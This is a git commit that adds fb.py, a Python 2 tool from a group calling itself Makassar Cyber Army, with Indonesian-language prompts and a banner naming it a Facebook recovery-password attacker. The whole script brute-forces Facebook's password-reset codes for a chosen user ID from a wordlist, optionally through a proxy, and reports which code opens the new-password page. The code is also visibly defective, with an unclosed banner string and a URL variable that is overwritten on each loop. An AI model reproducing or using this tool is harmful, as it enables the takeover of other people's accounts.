bb4164412960a9c3cd12ac6216e1573b8ba3cd55
MakassarCyberArmy <57331359+MakassarCyberArmy@users.noreply.github.com>
2019-11-04 06:11:04 +0800

    Add files via upload

---
+++ fb.py
@@ -0,0 +1,109 @@
+import urllib2 ,sys ,re
+import os
+import ssl
+import time
+
+def cls():
+    linux = 'clear'
+    windows = 'cls'
+    os.system([linux,windows][os.name == 'nt'])
+
+cls()
+
+os.system(['','color D'][os.name == 'nt'])
+
+print '''
+                WELCOME :)
+                      in
+              MAKASSAR CYBER ARMY
+           CODE: BY DARK•PSYCHO
+     FACEBOOK RECOVERY PASSWORD ATTACKER #SALAMHACKTIVIS
+  
+ _____              _                 _
+|  ___|_ _  ___ ___| |__   ___   ___ | | __
+| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
+|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
+|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\                                
+if len(sys.argv) != 3:
+    print "\n\n[#] Penulisan: python2 fb.py [TargetID] [listkode.txt] "
+    sys.exit()
+
+target = sys.argv[1]
+wordlist = sys.argv[2]
+
+
+while True:
+    print """
+    ============ Menu ==============
+    1- Reset Password Korban Dengan Proxy
+    2- Dengan Proxy saja
+    
+    """
+
+    choice=raw_input("Masuka  Pilihan Mu: ")
+
+    if choice=="1":
+        try:
+            word = open(wordlist, 'r').readlines()
+            print "[+] Kode Nya Tersimpan \!/\n[+] Codes:",len(word)
+        except("IOError"):
+            print "[-] Hanya dalam Format .txt Blabla"
+            sys.exit(1);
+
+        for w in word:
+            w = w.rstrip()
+            try:
+                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
+                get = urllib2.urlopen(target).read()
+    
+            except IOError:
+                print " Gabisa Dimuat Halaman Nya :( "
+    
+            search = re.search('password_new', get)
+            if search:
+                print "[+] Kode Yang Ini "+w+" Bener anda beruntung^___^ "
+            else:
+                print "[+] Kode Yangini "+w+" Salah sobat >:( "
+    else:
+
+        print """
+
+        Selamat Datang Di Tools MAKASSAR CYBER ARMY Masukan Proxy:Port Anda sobat :)
+
+        Penggunaan : [ip:port]
+
+
+        """
+        ip_proxy=raw_input("Masukan Proxy Mu  : ")
+        print "[##] Proxy Terpasang : "+ip_proxy
+        proxy = urllib2.ProxyHandler({'http': ip_proxy})
+        opener = urllib2.build_opener(proxy)
+        urllib2.install_opener(opener)
+        
+        #ip = urllib2.urlopen('http://checkip.dyndns.org').read()
+        #theIP = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", ip)
+        #print theIP
+        #datum = response.read()
+        #response.close()
+        #print datum
+        try:
+            word = open(wordlist, 'r').readlines()
+            print "[+] Kode Reset Tersimpan \!/\n[+] Kodd:",len(word)
+        except("IOError"):
+            print "[-] Yang Ini Gabisa Di Pake Sobatku !!"
+            sys.exit(1);
+
+        for w in word:
+            w = w.rstrip()
+            try:
+                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
+                get = urllib2.urlopen(target).read()
+                
+            except IOError:
+                print " Erorrr! halamannya tidak bisa dimuat "
+        
+            search = re.search('password_new', get)
+            if search:
+                print "[+] Kodenya yang ini "+w+" Benar sobat "
+            else:
+                print "[+] Kode Yang Ini "+w+" Gabisa Dipakai sobat "
